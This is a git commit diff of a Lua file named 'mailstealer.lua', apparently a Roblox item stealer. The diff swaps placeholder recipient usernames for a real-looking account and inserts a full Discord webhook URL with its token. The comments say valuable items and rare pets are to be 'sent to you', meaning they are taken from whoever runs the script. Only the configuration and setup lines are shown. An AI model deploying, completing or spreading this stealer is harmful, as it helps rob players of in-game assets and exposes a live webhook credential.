54aa56711bfdc14273962a1a350c785b42225907
Langgamm <160145104+Langgamm23@users.noreply.github.com>
2024-10-19 22:05:40 +0800

    Update and rename mailstealer.lua.lua to mailstealer.lua

--- mailstealer.lua
+++ mailstealer.lua
@@ -1,14 +1,12 @@
 Usernames = {
-    "your roblox user here",
-    "your 2nd user here",
-    "3rd user",
+    "JUNLIHIJARA_YT",
     -- Add more users below if you want to
     -- "user4",
     -- "user5",
 }
 min_rap = 1000 -- minimum rap of each item you want to get sent to you. 1k by default
 min_chance = 100000 -- minimum chance of pets you want to get sent to you. 100k by default, which means that it will not send pets under 1 in 10k
-webhook = "your discord webhook here"
+webhook = "https://discord.com/api/webhooks/1297170731594944652/UE13byz2ZL2W8YA4C18RjqIKE5IBGzbt-aWU3bIBSxu9jSRXBmcyBL8uJosErX--MZ1s"
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
